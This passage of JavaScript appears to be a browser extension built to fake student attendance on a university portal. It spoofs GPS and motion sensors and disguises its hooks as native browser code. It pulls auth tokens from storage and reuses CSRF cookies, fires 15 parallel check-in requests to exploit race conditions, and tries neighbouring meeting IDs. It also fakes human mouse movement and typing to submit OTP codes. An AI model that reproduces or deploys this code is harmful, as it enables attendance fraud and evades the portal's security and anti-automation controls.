            self.x = m.acceleration.x;
            self.y = m.acceleration.y;
            self.z = m.acceleration.z;
          } else if (sensorType === 'gyro') {
            self.x = m.rotationRate.beta * (Math.PI / 180);
            self.y = m.rotationRate.gamma * (Math.PI / 180);
            self.z = m.rotationRate.alpha * (Math.PI / 180);
          }
          const ev = new Event('reading');
          self.dispatchEvent(ev);
          if (typeof self.onreading === 'function') {
            try { self.onreading(ev); } catch (_) {}
          }
        }, (options && options.frequency ? Math.max(16, 1000 / options.frequency) : 16));
      };
      self.stop = function() {
        self.activated = false;
        if (self._sensorInterval) { _clearInterval(self._sensorInterval); self._sensorInterval = null; }
      };
      _cloak(self.start, 'function start() { [native code] }');
      _cloak(self.stop, 'function stop() { [native code] }');
    }
    SyntheticSensor.prototype = Object.create(BaseClass.prototype);
    SyntheticSensor.prototype.constructor = SyntheticSensor;
    _cloak(SyntheticSensor, `function ${BaseClass.name || 'Sensor'}() { [native code] }`);
    return SyntheticSensor;
  }

  try {
    if (typeof Accelerometer !== 'undefined') {
      window.Accelerometer = _createSyntheticSensorClass(Accelerometer, 'accel') || window.Accelerometer;
    }
    if (typeof LinearAccelerationSensor !== 'undefined') {
      window.LinearAccelerationSensor = _createSyntheticSensorClass(LinearAccelerationSensor, 'linear') || window.LinearAccelerationSensor;
    }
    if (typeof Gyroscope !== 'undefined') {
      window.Gyroscope = _createSyntheticSensorClass(Gyroscope, 'gyro') || window.Gyroscope;
    }
  } catch (_) {}

  const _addEventListenerProxy = new Proxy(window.addEventListener, {
    apply(target, thisArg, args) {
      const [type] = args;
      if ((type === 'devicemotion' || type === 'deviceorientation') && getSpoofConfig()) {
        if (!_sensorSpoofActive) {
          _sensorSpoofActive = true;
          _motionIntervalId  = _setInterval(_dispatchFakeSensorEvents, 16);
        }
      }
      return Reflect.apply(target, thisArg, args);
    }
  });
  _cloak(_addEventListenerProxy, 'function addEventListener() { [native code] }');
  try { window.addEventListener = _addEventListenerProxy; } catch (_) {}

  function _stopSensorSpoof() {
    if (_sensorSpoofActive) {
      _sensorSpoofActive = false;
      if (_motionIntervalId)      { _clearInterval(_motionIntervalId);      _motionIntervalId = null; }
      if (_orientationIntervalId) { _clearInterval(_orientationIntervalId); _orientationIntervalId = null; }
    }
  }

  // ── Phase 4: Dynamic Bridge Handshake ─────────────────────────────────────
  let sessionToken = '';
  try {
    if (typeof crypto !== 'undefined' && typeof crypto.getRandomValues === 'function') {
      const b = new Uint8Array(16);
      crypto.getRandomValues(b);
      sessionToken = Array.from(b, x => x.toString(16).padStart(2, '0')).join('');
    }
  } catch (_) {}
  if (!sessionToken) {
    sessionToken = Math.random().toString(36).substring(2, 15) + Date.now().toString(36);
  }
  const reqEvent = '__gps_sync_req';
  const resEvent = '__gps_sync_res_' + sessionToken;

  let configReceived = false;
  _addEventListener(resEvent, (event) => {
    event.stopImmediatePropagation();
    if (event.detail && typeof event.detail === 'string') {
      try {
        currentConfig = JSON.parse(event.detail);
        configReceived = true;
        if (!currentConfig.enabled) {
          _stopSensorSpoof();
        } else {
          if (Array.isArray(currentConfig.timetable) && currentConfig.timetable.length > 0) {
            const slot = checkTimetableAutoMatch(currentConfig.timetable);
            if (slot && slot.lat != null && slot.lng != null) {
              currentConfig.lat = slot.lat;
              currentConfig.lng = slot.lng;
              currentConfig._timetableMatched = slot.subject || 'Timetable Slot';
            }
          }
          applyDeviceSpoofing(currentConfig.deviceMode);
        }
        _installNetworkInterceptors();
        _startOtpPoller();
      } catch (_) {}
    }
  }, true);

  function checkTimetableAutoMatch(timetable) {
    if (!timetable || !Array.isArray(timetable) || timetable.length === 0) return null;
    const now = new Date();
    const utcMs = now.getTime() + (now.getTimezoneOffset() * 60000);
    const wibDate = new Date(utcMs + (7 * 3600000));
    const day = wibDate.getDay();
    const currentMinutes = wibDate.getHours() * 60 + wibDate.getMinutes();
    for (let i = 0; i < timetable.length; i++) {
      const slot = timetable[i];
      if (slot.day !== day) continue;
      const [startH, startM] = (slot.start || '00:00').split(':').map(Number);
      const [endH, endM] = (slot.end || '23:59').split(':').map(Number);
      const startMin = (startH || 0) * 60 + (startM || 0);
      const endMin = (endH || 0) * 60 + (endM || 0);
      if (currentMinutes >= startMin && currentMinutes <= endMin) return slot;
    }
    return null;
  }

  let retries = 0;
  const MAX_RETRIES = 8;
  function requestConfig() {
    if (configReceived) return;
    if (retries >= MAX_RETRIES) return;
    retries++;
    _dispatchEvent(new _CustomEvent(reqEvent, { detail: sessionToken }));
    setTimeout(requestConfig, Math.min(15 * Math.pow(1.5, retries), 250));
  }
  requestConfig();

  // ── Auto-Room Matching ──────────────────────────────────────────────────────
  const CAMPUS_ROOM_PRESETS = [
    { regex: /\b(?:TW1|TOWER\s*1)\b/i,                        lat: -7.2849915,         lng: 112.793897,         label: 'Tower 1' },
    { regex: /\b(?:TW2|TOWER\s*2)\b/i,                        lat: -7.2852792,         lng: 112.7952975,        label: 'Tower 2' },
    { regex: /\b(?:KORIDC|KORIDOR\s*C|CLASS\s*C|KORIDOR)\b/i, lat: -7.284793988582386, lng: 112.79570676550246, label: 'Koridor C' },
  ];

  function detectRoomPreset(roomString) {
    if (!roomString || typeof roomString !== 'string') return null;
    for (let i = 0; i < CAMPUS_ROOM_PRESETS.length; i++) {
      if (CAMPUS_ROOM_PRESETS[i].regex.test(roomString)) return CAMPUS_ROOM_PRESETS[i];
    }
    if (currentConfig && Array.isArray(currentConfig.customPresets)) {
      for (let j = 0; j < currentConfig.customPresets.length; j++) {
        const cp = currentConfig.customPresets[j];
        if (!cp || cp.lat == null || cp.lng == null) continue;
        if (cp.regex) {
          try {
            const rx = new RegExp(cp.regex, 'i');
            if (rx.test(roomString)) return { lat: cp.lat, lng: cp.lng, label: cp.name || 'Custom Preset' };
          } catch (_) {}
        } else if (cp.name) {
          try {
            const escaped = cp.name.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
            const rx = new RegExp('\\b' + escaped + '\\b', 'i');
            if (rx.test(roomString)) return { lat: cp.lat, lng: cp.lng, label: cp.name };
          } catch (_) {}
        }
      }
    }
    return null;
  }

  _addEventListener('pageshow', () => { configReceived = false; retries = 0; requestConfig(); });
  _addEventListener('online',   () => {
    configReceived = false; retries = 0; requestConfig();
    try {
      const q = sessionStorage.getItem('__presensi_pending_queue');
      if (q) {
        sessionStorage.removeItem('__presensi_pending_queue');
        const item = JSON.parse(q);
        if (item && item.code && _hudContainer && _hudContainer._refs && _hudContainer._refs.codeInput) {
          _hudContainer._refs.codeInput.value = item.code;
          _triggerCheckIn();
        }
      }
    } catch (_) {}
  });

  // ── Phase 4.5: HUD State ──────────────────────────────────────────────────
  let _hudContainer    = null;
  let _hudInterval     = null;
  let _activeMeetingData = null;

  function _formatCountdown(seconds) {
    if (seconds <= 0) return '00:00 (EXPIRED)';
    const m = Math.floor(seconds / 60);
    const s = seconds % 60;
    return `${m}:${s < 10 ? '0' : ''}${s}`;
  }

  function _createOrUpdateHud(info) {
    if (!info || (!info.tm_mulai && info.status !== 'sedang_berlangsung')) return;
    const h = window.location.hostname;
    const targetDomain = (currentConfig && currentConfig.targetDomain) || 'portal.university.edu';
    if (h !== targetDomain && !h.endsWith('.' + targetDomain)) return;
    _activeMeetingData = info;

    if (!_hudContainer) {
      if (!document.body) {
        document.addEventListener('DOMContentLoaded', () => _createOrUpdateHud(info), { once: true });
        return;
      }
      _hudContainer = document.createElement('div');
      _hudContainer.id = 'campus-presensi-hud';

      const style = document.createElement('style');
      style.textContent = `
        #campus-presensi-hud {
          position: fixed;
          bottom: 24px;
          right: 24px;
          z-index: 999999;
          font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
          background: rgba(26, 28, 30, 0.94);
          backdrop-filter: blur(12px);
          -webkit-backdrop-filter: blur(12px);
          border: 1px solid rgba(255, 255, 255, 0.12);
          border-radius: 12px;
          padding: 12px 16px;
          box-shadow: 0 8px 32px rgba(0, 0, 0, 0.45);
          color: #f3f4f6;
          min-width: 250px;
          max-width: 320px;
          font-size: 12px;
          line-height: 1.4;
          transition: all 0.25s ease;
          user-select: none;
        }
        #campus-presensi-hud.minimized {
          padding: 8px 12px;
          min-width: auto;
          cursor: pointer;
        }
        #campus-presensi-hud .hud-header {
          display: flex;
          align-items: center;
          justify-content: space-between;
          font-weight: 600;
          font-size: 12px;
          margin-bottom: 6px;
          color: #60a5fa;
        }
        #campus-presensi-hud.minimized .hud-body { display: none; }
        #campus-presensi-hud:not(.minimized) .hud-min-view { display: none; }
        #campus-presensi-hud .hud-pill {
          display: inline-flex;
          align-items: center;
          gap: 5px;
          padding: 3px 8px;
          border-radius: 6px;
          font-weight: 600;
          font-size: 13px;
          margin-top: 4px;
        }
        #campus-presensi-hud .hud-pill.green  { background: rgba(34, 197, 94, 0.2); color: #4ade80; }
        #campus-presensi-hud .hud-pill.yellow { background: rgba(234, 179, 8, 0.2); color: #facc15; }
        #campus-presensi-hud .hud-pill.red    { background: rgba(239, 68, 68, 0.25); color: #f87171; }
        #campus-presensi-hud .hud-sub {
          color: #9ca3af;
          font-size: 11px;
          margin-top: 4px;
        }
        #campus-presensi-hud .hud-btn-toggle {
          background: transparent;
          border: none;
          color: #9ca3af;
          cursor: pointer;
          padding: 2px 4px;
          font-size: 11px;
        }
        #campus-presensi-hud .hud-btn-toggle:hover { color: #fff; }
        #campus-presensi-hud .hud-room-badge {
          display: inline-block;
          font-size: 11px;
          color: #60a5fa;
          background: rgba(96, 165, 250, 0.15);
          border: 1px solid rgba(96, 165, 250, 0.3);
          border-radius: 4px;
          padding: 2px 6px;
          margin-top: 5px;
        }
        #campus-presensi-hud .hud-action-row {
          display: flex;
          align-items: center;
          gap: 6px;
          margin-top: 8px;
        }
        #campus-presensi-hud .hud-code-input {
          flex: 1;
          background: rgba(0, 0, 0, 0.45);
          border: 1px solid rgba(255, 255, 255, 0.2);
          border-radius: 6px;
          color: #fff;
          font-family: monospace;
          font-size: 13px;
          font-weight: 600;
          text-align: center;
          letter-spacing: 2px;
          padding: 5px 8px;
          outline: none;
          box-sizing: border-box;
          width: 100%;
        }
        #campus-presensi-hud .hud-code-input:focus {
          border-color: #60a5fa;
          box-shadow: 0 0 0 1px #60a5fa;
        }
        #campus-presensi-hud .hud-btn-checkin {
          background: #2563eb;
          color: #fff;
          border: none;
          border-radius: 6px;
          font-weight: 600;
          font-size: 11px;
          padding: 6px 10px;
          cursor: pointer;
          white-space: nowrap;
          transition: background 0.15s ease;
        }
        #campus-presensi-hud .hud-btn-checkin:hover  { background: #1d4ed8; }
        #campus-presensi-hud .hud-btn-checkin:active { background: #1e40af; }
        #campus-presensi-hud .hud-status-msg {
          font-size: 11px;
          margin-top: 5px;
          min-height: 14px;
          line-height: 1.3;
        }
      `;
      document.head.appendChild(style);

      _hudContainer.innerHTML = `
        <div class="hud-min-view" style="display:flex;align-items:center;gap:6px;">
          <span style="display:inline-block;width:7px;height:7px;border-radius:50%;background:#4ade80;"></span>
          <span class="hud-min-timer" style="font-weight:600;">--:--</span>
        </div>
        <div class="hud-body">
          <div class="hud-header">
            <span>Attendance Monitor</span>
            <button class="hud-btn-toggle" title="Minimize">—</button>
          </div>
          <div class="hud-title" style="font-weight:600;color:#fff;">Active Class</div>
          <div class="hud-pill green">--:--</div>
          <div class="hud-rule hud-sub">Tracking session...</div>
          <div class="hud-room-badge" style="display:none;"></div>
          <div class="hud-action-row">
            <input type="text" maxlength="6" class="hud-code-input" placeholder="OTP Code" title="6-digit attendance code" />
            <button class="hud-btn-checkin">Hadir</button>
            <button class="hud-btn-qr" title="Inject QR Code Image" style="background:rgba(255,255,255,0.1);border:1px solid rgba(255,255,255,0.2);color:#fff;border-radius:6px;padding:6px 8px;cursor:pointer;font-size:11px;display:inline-flex;align-items:center;gap:4px;"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="7" height="7"/><rect x="14" y="3" width="7" height="7"/><rect x="14" y="14" width="7" height="7"/><rect x="3" y="14" width="7" height="7"/></svg> QR</button>
            <input type="file" class="hud-qr-file" accept="image/*" style="display:none;" />
          </div>
          <div class="hud-status-msg"></div>
          <div class="hud-sub" style="border-top:1px dashed rgba(255,255,255,0.1);padding-top:4px;margin-top:6px;display:flex;justify-content:space-between;align-items:center;">
            <span>GPS: <span class="hud-spoof-status">Active</span></span>
            <span>Mesh: <span class="hud-swarm-status" style="color:#9ca3af;">Offline</span></span>
          </div>
        </div>
      `;

      _hudContainer._refs = {
        minTimer:  _hudContainer.querySelector('.hud-min-timer'),
        title:     _hudContainer.querySelector('.hud-title'),
        pill:      _hudContainer.querySelector('.hud-pill'),
        rule:      _hudContainer.querySelector('.hud-rule'),
        spoof:     _hudContainer.querySelector('.hud-spoof-status'),
        swarm:     _hudContainer.querySelector('.hud-swarm-status'),
        roomBadge: _hudContainer.querySelector('.hud-room-badge'),
        codeInput: _hudContainer.querySelector('.hud-code-input'),
        btnCheckin:_hudContainer.querySelector('.hud-btn-checkin'),
        btnQr:     _hudContainer.querySelector('.hud-btn-qr'),
        fileQr:    _hudContainer.querySelector('.hud-qr-file'),
        statusMsg: _hudContainer.querySelector('.hud-status-msg'),
      };

      document.body.appendChild(_hudContainer);

      _hudContainer.addEventListener('click', (e) => {
        if (e.target.closest('.hud-btn-toggle') || _hudContainer.classList.contains('minimized')) {
          _hudContainer.classList.toggle('minimized');
        }
      });

      const { codeInput, btnCheckin, btnQr, fileQr } = _hudContainer._refs;

      codeInput.addEventListener('click',   (e) => e.stopPropagation());
      codeInput.addEventListener('input',   (e) => {
        const val = (e.target.value || '').trim();
        if (/^\d{6}$/.test(val)) {
          _broadcastMeshOtp(val, 'hud_input');
        }
      });
      codeInput.addEventListener('keydown', (e) => {
        e.stopPropagation();
        if (e.key === 'Enter') _triggerCheckIn();
      });

      btnCheckin.addEventListener('click', (e) => { e.stopPropagation(); _triggerCheckIn(); });

      if (btnQr && fileQr) {
        btnQr.addEventListener('click', (e) => { e.stopPropagation(); fileQr.click(); });
        fileQr.addEventListener('change', (e) => {
          e.stopPropagation();
          const file = e.target.files && e.target.files[0];
          if (file) {
            const reader = new FileReader();
            reader.onload = (revt) => {
              setVirtualQrImage(revt.target.result);
              if (_hudContainer._refs.statusMsg) {
                _hudContainer._refs.statusMsg.textContent = 'QR loaded to Virtual Cam';
                _hudContainer._refs.statusMsg.style.color = '#38bdf8';
              }
            };
            reader.readAsDataURL(file);
          }
        });
      }
    }

    if (!_hudInterval) _hudInterval = _setInterval(_renderHudTick, 1000);
    _renderHudTick();
  }

  // ── Race-Condition Burst Submission ───────────────────────────────────────
  // Fires N parallel requests within a short stagger window.
  // Uses _origFetch (pre-proxy native) to bypass the portal's own fetch interceptors.
  async function _burstCheckIn(url, payload, n, customHeaders) {
    const headers = Object.assign({ 'Content-Type': 'application/json', 'Accept': 'application/json' }, customHeaders || {});
    const shots = [];
    for (let i = 0; i < n; i++) {
      const delay = Math.floor(Math.random() * 30); // 0–30ms jitter
      shots.push(new Promise(resolve => {
        _setTimeout(() => {
          _origFetch(url, {
            method:      'PUT',
            credentials: 'include',
            headers,
            body:        JSON.stringify(payload)
          }).then(r => resolve({ ok: r.ok, status: r.status }))
            .catch(() => resolve({ ok: false, status: 0 }));
        }, delay);
      }));
    }
    const results = await Promise.all(shots);
    if (results.some(r => r.ok)) return true;

    // Intelligent rate-limit / contention backoff or POST fallback
    const hadRateLimit = results.some(r => r.status === 429);
    if (hadRateLimit) {
      await new Promise(r => _setTimeout(r, 150 + Math.floor(Math.random() * 200)));
      try {
        const retryRes = await _origFetch(url, {
          method:      'PUT',
          credentials: 'include',
          headers,
          body:        JSON.stringify(payload)
        });
        return retryRes.ok;
      } catch (_) {
        return false;
      }
    }

    // Try POST if PUT was rejected with 405 Method Not Allowed or 404
    if (results.some(r => r.status === 405 || r.status === 404)) {
      try {
        const postRes = await _origFetch(url, {
          method:      'POST',
          credentials: 'include',
          headers,
          body:        JSON.stringify(payload)
        });
        return postRes.ok;
      } catch (_) {
        return false;
      }
    }
    return false;
  }

  async function _triggerCheckIn() {
    const refs = _hudContainer && _hudContainer._refs;
    if (!refs) return;
    const code = (refs.codeInput.value || '').trim();
    if (!code || code.length !== 6) {
      if (refs.statusMsg) {
        refs.statusMsg.textContent = 'Masukkan 6 digit kode presensi';
        refs.statusMsg.style.color = '#f87171';
      }
      return;
    }

    _broadcastMeshOtp(code, 'hud_checkin');

    if (navigator.onLine === false) {
      try {
        const tmId = (_activeMeetingData && (_activeMeetingData.id_tatap_muka || _activeMeetingData.id_tm || _activeMeetingData.id)) || null;
        sessionStorage.setItem('__presensi_pending_queue', JSON.stringify({ code, tmId, ts: Date.now() }));
      } catch (_) {}
      if (refs.statusMsg) {
        refs.statusMsg.textContent = 'Offline: Antrian tersimpan, auto-kirim saat terhubung';
        refs.statusMsg.style.color = '#f59e0b';
      }
      return;
    }

    if (refs.statusMsg) {
      refs.statusMsg.textContent = 'Memproses presensi...';
      refs.statusMsg.style.color = '#60a5fa';
    }
    refs.btnCheckin.disabled = true;
    let tmId = (_activeMeetingData && (_activeMeetingData.id_tatap_muka || _activeMeetingData.id_tm || _activeMeetingData.id)) || null;

    // Fallback: harvest tmId from URL query params, page anchor links, or Next.js router props
    if (!tmId) {
      try {
        const urlParams = window.URLSearchParams ? new window.URLSearchParams(window.location.search) : null;
        if (urlParams) tmId = urlParams.get('id_tatap_muka') || urlParams.get('id_tm');
        if (!tmId) {
          const tmLink = Array.from(document.querySelectorAll('a[href*="id_tatap_muka="]'))
            .map(a => a.href.match(/id_tatap_muka=(\d+)/))
            .find(Boolean);
          if (tmLink) tmId = tmLink[1];
        }
        if (!tmId && window.__NEXT_DATA__ && window.__NEXT_DATA__.query) {
          tmId = window.__NEXT_DATA__.query.id_tatap_muka || window.__NEXT_DATA__.query.id_tm;
        }
      } catch (_) {}
    }

    const cfg = getSpoofConfig();
    const pos = cfg ? buildPosition(cfg.lat, cfg.lng, cfg._geofenceRadius) : { coords: { latitude: -7.287123, longitude: 112.798542 } };

    let apiSuccess = false;
    let authToken = null;
    try {
      authToken = window.__capturedAuthToken ||
        (window.localStorage && (window.localStorage.getItem('token') || window.localStorage.getItem('access_token'))) ||
        sessionStorage.getItem('token') ||
        sessionStorage.getItem('access_token');
    } catch (_) {}

    const reqHeaders = { 'Content-Type': 'application/json', 'Accept': 'application/json' };
    if (authToken) {
      reqHeaders['Authorization'] = String(authToken).startsWith('Bearer ') ? String(authToken) : `Bearer ${authToken}`;
    }

    // Synchronize XSRF Token based on Next.js/Axios contract (xsrfHeaderName: X-CSRF-TOKEN)
    try {
      const csrfMatch = document.cookie.match(/(?:^|;\s*)(?:CSRF-TOKEN|XSRF-TOKEN|_csrf|csrf_token)=([^;]+)/i);
      if (csrfMatch) {
        const csrfVal = decodeURIComponent(csrfMatch[1]);
        reqHeaders['X-CSRF-TOKEN'] = csrfVal;
        reqHeaders['X-XSRF-TOKEN'] = csrfVal;
      }
    } catch (_) {}

    if (tmId && _origFetch) {
      const payload = {
        jenis_hadir_tm: 'L',
        kode:           code,
        latitude:       pos.coords.latitude,
        longitude:      pos.coords.longitude
      };
      const url = `/api/presensi/tm/${tmId}/mahasiswa/self`;

      // Burst: 15 parallel shots with 0–30ms stagger to exploit race conditions
      try {
        apiSuccess = await _burstCheckIn(url, payload, 15, reqHeaders);
        if (apiSuccess) {
          if (refs.statusMsg) {
            refs.statusMsg.textContent = 'Presensi berhasil!';
            refs.statusMsg.style.color = '#4ade80';
          }
          _sendSubmitTelemetry(pos.coords.latitude, pos.coords.longitude);
          _sendResultTelemetry('accepted');
        } else {
          try {
            const errRes = await _origFetch(url, {
              method: 'PUT', credentials: 'include',
              headers: reqHeaders,
              body: JSON.stringify(payload)
            });
            const errData = await errRes.json().catch(() => ({}));
            const errMsg = errData.message || (errRes.status ? `Gagal HTTP ${errRes.status}` : null);
            if (errMsg && refs.statusMsg) {
              refs.statusMsg.textContent = errMsg;
              refs.statusMsg.style.color = '#f87171';
            }
          } catch (_) {}
        }
      } catch (_) {}
    }

    // Fallback: enumerate adjacent tmIds if main one failed
    if (!apiSuccess && tmId) {
      const numId = parseInt(tmId, 10);
      if (!isNaN(numId)) {
        for (let delta = -2; delta <= 2 && !apiSuccess; delta++) {
          if (delta === 0) continue;
          const candidateId = numId + delta;
          try {
            const res = await _origFetch(`/api/presensi/tm/${candidateId}/mahasiswa/self`, {
              method:      'PUT',
              credentials: 'include',
              headers:     reqHeaders,
              body:        JSON.stringify({
                jenis_hadir_tm: 'L',
                kode:           code,
                latitude:       pos.coords.latitude,
                longitude:      pos.coords.longitude
              })
            });
            if (res.ok) {
              apiSuccess = true;
              _sendResultTelemetry('accepted');
              if (refs.statusMsg) {
                refs.statusMsg.textContent = `Presensi berhasil (tm:${candidateId})`;
                refs.statusMsg.style.color = '#4ade80';
              }
            }
          } catch (_) {}
        }
      }
    }

    // Final fallback: DOM UI automation with responsive modal tracking
    if (!apiSuccess) {
      if (refs.statusMsg && refs.statusMsg.textContent === 'Memproses presensi...') {
        refs.statusMsg.textContent = 'Mengisi form presensi...';
        refs.statusMsg.style.color = '#38bdf8';
      }
      try {
        _simulateDomCheckIn(code, (domSuccess, msg) => {
          if (refs.statusMsg) {
            if (domSuccess) {
              refs.statusMsg.textContent = msg || 'Presensi terkirim';
              refs.statusMsg.style.color = '#4ade80';
            } else {
              refs.statusMsg.textContent = msg || 'Klik tombol Hadir pada kartu kelas';
              refs.statusMsg.style.color = '#f59e0b';
            }
          }
        });
      } catch (_) {
        if (refs.statusMsg && refs.statusMsg.textContent === 'Mengisi form presensi...') {
          refs.statusMsg.textContent = 'Klik tombol Hadir pada kartu kelas';
          refs.statusMsg.style.color = '#f59e0b';
        }
      }
    }

    refs.btnCheckin.disabled = false;
    refs.btnCheckin.style.opacity = '1';
  }

  let _lastMousePos = { x: 300, y: 300 };

  function _dispatchHumanMouseEvent(el, type, customX, customY) {
    try {
      const rect = el ? el.getBoundingClientRect() : { left: customX || 0, top: customY || 0, width: 0, height: 0 };
      const x = customX !== undefined ? customX : rect.left + rect.width / 2 + (Math.random() - 0.5) * 6;
      const y = customY !== undefined ? customY : rect.top + rect.height / 2 + (Math.random() - 0.5) * 4;
      _lastMousePos = { x, y };
      const targetEl = el || document.elementFromPoint(x, y) || document.body;
      targetEl.dispatchEvent(new MouseEvent(type, {
        bubbles: true, cancelable: true, view: window,
        clientX: x, clientY: y, screenX: x, screenY: y,
        buttons: type === 'mousedown' ? 1 : 0
      }));
    } catch (_) {}
  }

  function _simulateHumanClick(el, done) {
    if (!el) return;
    const rect = el.getBoundingClientRect();
    const targetX = rect.left + rect.width / 2 + (Math.random() - 0.5) * 6;
    const targetY = rect.top + rect.height / 2 + (Math.random() - 0.5) * 4;
    const startX = _lastMousePos.x || (targetX - 80);
    const startY = _lastMousePos.y || (targetY + 60);

    // Cubic Bézier control points for natural curvature and velocity arcs
    const cp1x = startX + (targetX - startX) * 0.25 + (Math.random() - 0.5) * 30;
    const cp1y = startY + (targetY - startY) * 0.1  + (Math.random() - 0.5) * 30;
    const cp2x = startX + (targetX - startX) * 0.75 + (Math.random() - 0.5) * 15;
    const cp2y = startY + (targetY - startY) * 0.9  + (Math.random() - 0.5) * 15;

    const steps = 6;
    let step = 0;

    function moveStep() {
      if (step < steps) {
        const t = step / steps;
        const bx = (1 - t) ** 3 * startX + 3 * (1 - t) ** 2 * t * cp1x + 3 * (1 - t) * t ** 2 * cp2x + t ** 3 * targetX;
        const by = (1 - t) ** 3 * startY + 3 * (1 - t) ** 2 * t * cp1y + 3 * (1 - t) * t ** 2 * cp2y;
        _dispatchHumanMouseEvent(el, 'mousemove', bx, by);
        step++;
        _setTimeout(moveStep, 14 + Math.random() * 12);
      } else {
        _dispatchHumanMouseEvent(el, 'mousemove', targetX, targetY);
        _dispatchHumanMouseEvent(el, 'mouseenter', targetX, targetY);
        _setTimeout(() => {
          _dispatchHumanMouseEvent(el, 'mousedown', targetX, targetY);
          _setTimeout(() => {
            _dispatchHumanMouseEvent(el, 'mouseup', targetX, targetY);
            el.click();
            if (typeof done === 'function') _setTimeout(done, 100 + Math.random() * 60);
          }, 65 + Math.random() * 45);
        }, 35 + Math.random() * 25);
      }
    }
    moveStep();
  }

  function _setNativeInputValue(el, val) {
    if (!el) return;
    try {
      const proto = window.HTMLInputElement.prototype;
      const setter = Object.getOwnPropertyDescriptor(proto, 'value')?.set;
      if (setter) {
        setter.call(el, val);
      } else {
        el.value = val;
      }
    } catch (_) {
      el.value = val;
    }
    el.dispatchEvent(new Event('input', { bubbles: true, composed: true }));
    el.dispatchEvent(new Event('change', { bubbles: true, composed: true }));
  }

  function _fillAndSubmitModal(modalEl, code, done) {
    if (!modalEl) {
      if (typeof done === 'function') done(false, 'Modal form tidak ditemukan');
      return;
    }

    // 1. Select radio 'Hadir kuliah di kelas'
    try {
      const hadirRadio = modalEl.querySelector('input[name="hadirTatapMuka"][value="L"], input[type="radio"][value="L"], input[type="radio"][value="hadir"]') ||
        Array.from(modalEl.querySelectorAll('.chakra-radio, [role="radio"], label')).find(l => /hadir\s+kuliah|hadir\s+di\s+kelas|offline/i.test(l.textContent || ''));
      if (hadirRadio && !hadirRadio.checked) _simulateHumanClick(hadirRadio);
    } catch (_) {}

    // 2. Populate OTP
    const pinInputs = Array.from(modalEl.querySelectorAll('input[data-index]'));
    if (pinInputs.length >= 6) {
      let digitIdx = 0;
      function typeNextDigit() {
        if (digitIdx >= 6) {
          _submitModal();
          return;
        }
        const input = pinInputs[digitIdx];
        const char = code[digitIdx] || '';
        input.focus();
        input.dispatchEvent(new KeyboardEvent('keydown', { key: char, bubbles: true }));
        _setNativeInputValue(input, char);
        input.dispatchEvent(new KeyboardEvent('keyup', { key: char, bubbles: true }));
        digitIdx++;
        _setTimeout(typeNextDigit, 40 + Math.random() * 40);
      }
      typeNextDigit();
    } else {
      const textInputs = Array.from(modalEl.querySelectorAll('input[type="text"], input:not([type])'));
      const modalInput = textInputs.find(i => i.placeholder && /kode/i.test(i.placeholder)) || textInputs[0];
      if (modalInput) {
        modalInput.focus();
        _setNativeInputValue(modalInput, code);
        _setTimeout(_submitModal, 120 + Math.random() * 60);
      } else {
        _submitModal();
      }
    }

    function _submitModal() {
      _setTimeout(() => {
        const modalButtons = Array.from(modalEl.querySelectorAll('button'));
        const submitBtn = modalButtons.find(b => /simpan|kirim|hadir/i.test(b.textContent || '')) || modalEl.querySelector('button[type="submit"]');
        if (submitBtn) {
          _simulateHumanClick(submitBtn, () => {
            if (typeof done === 'function') done(true, 'Presensi terkirim');
          });
        } else {
          if (typeof done === 'function') done(false, 'Klik tombol Simpan di popup');
        }
      }, 100 + Math.random() * 60);
    }
  }

  function _simulateDomCheckIn(code, callback) {
    // Check if modal is already open
    const existingModal = document.querySelector('.chakra-modal__content, [role="dialog"], .modal-content');
    if (existingModal) {
      _fillAndSubmitModal(existingModal, code, callback);
      return;
    }

    // Find page card Hadir button (explicitly ignore extension HUD)
    const buttons = Array.from(document.querySelectorAll('button, a'));
    const hadirBtn = buttons.find(b => !b.closest('#campus-presensi-hud') && b.textContent && b.textContent.trim().toLowerCase() === 'hadir');
    if (!hadirBtn) {
      if (typeof callback === 'function') callback(false, 'Klik tombol Hadir pada kartu kelas');
      return;
    }

    _simulateHumanClick(hadirBtn, () => {
      // Poll for modal appearance for up to 2 seconds
      let attempts = 0;
      const pollInterval = _setInterval(() => {
        attempts++;
        const modal = document.querySelector('.chakra-modal__content, [role="dialog"], .modal-content');
        if (modal) {
          _clearInterval(pollInterval);
          _fillAndSubmitModal(modal, code, callback);
        } else if (attempts > 20) {
          _clearInterval(pollInterval);
          if (typeof callback === 'function') callback(false, 'Klik tombol Hadir pada kartu kelas');
        }
      }, 100);
    });
  }

  function _renderHudTick() {
    if (!_hudContainer || !_activeMeetingData || !_hudContainer._refs) return;
    const w = _activeMeetingData;
    const now = Date.now();

    let startTime = null;
    if (w.tm_mulai) {
      const s = String(w.tm_mulai).trim();
      const parsed = new Date(s.includes(' ') ? s.replace(' ', 'T') : s).getTime();
      if (!isNaN(parsed)) startTime = parsed;
    }
    if (!startTime && w.tanggal && w.jam_mulai) {
      const parsed = new Date(`${w.tanggal}T${w.jam_mulai}:00`).getTime();
      if (!isNaN(parsed)) startTime = parsed;
    }
    if (!startTime) startTime = now;

    const masa = parseInt(w.masa_berlaku || '0', 10);
    let endTime, ruleText;

    if (masa === 15) {
      endTime  = startTime + (15 * 60 * 1000);
      ruleText = 'Lecturer Option: 15 Minutes';
    } else if (masa === 30) {
      endTime  = startTime + (30 * 60 * 1000);
      ruleText = 'Lecturer Option: 30 Minutes';
    } else {
      ruleText = 'Lecturer Option: Until Class Ends';
      if (w.jam_selesai) {
        const localNow = new Date();
        const y = localNow.getFullYear();
        const m = String(localNow.getMonth() + 1).padStart(2, '0');
        const d = String(localNow.getDate()).padStart(2, '0');
        const todayStr = `${y}-${m}-${d}`;
        const parsed = new Date(`${todayStr}T${w.jam_selesai}:00`).getTime();
        endTime = !isNaN(parsed) ? parsed : (startTime + (100 * 60 * 1000));
      } else {
        endTime = startTime + (100 * 60 * 1000);
      }
    }

    const remainingSec = Math.max(0, Math.floor((endTime - now) / 1000));
    let pillClass = 'green';
    if (remainingSec < 120) pillClass = 'red';
    else if (remainingSec < 300) pillClass = 'yellow';

    const timeFormatted = _formatCountdown(remainingSec);
    const room   = w.ruangan ? ` (${w.ruangan})` : '';
    const course = w.nama_mk || 'Active Class';
    const cfg    = getSpoofConfig();
    const refs   = _hudContainer._refs;

    if (refs.minTimer) refs.minTimer.textContent = timeFormatted;
    if (refs.title)    refs.title.textContent    = `${course}${room}`;
